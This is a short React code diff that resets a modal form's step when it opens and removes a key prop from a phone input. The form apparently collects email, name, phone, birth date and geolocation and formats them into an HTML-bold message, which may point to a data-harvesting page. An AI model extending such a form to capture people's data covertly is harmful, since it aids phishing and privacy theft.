@@ -58,7 +58,14 @@ const InitModal: FC = () => {
         birthYear: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
+    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep, isModalOpen } = store();
+
+    // Reset form step when modal opens
+    useEffect(() => {
+        if (isModalOpen && formStep !== 'init') {
+            setFormStep('init');
+        }
+    }, [isModalOpen, formStep, setFormStep]);
 
     // Geo-detection effect - only run once on mount
     useEffect(() => {
@@ -293,7 +300,6 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                         ))}
                         <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                         <IntlTelInput
-                            key={countryCode}
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
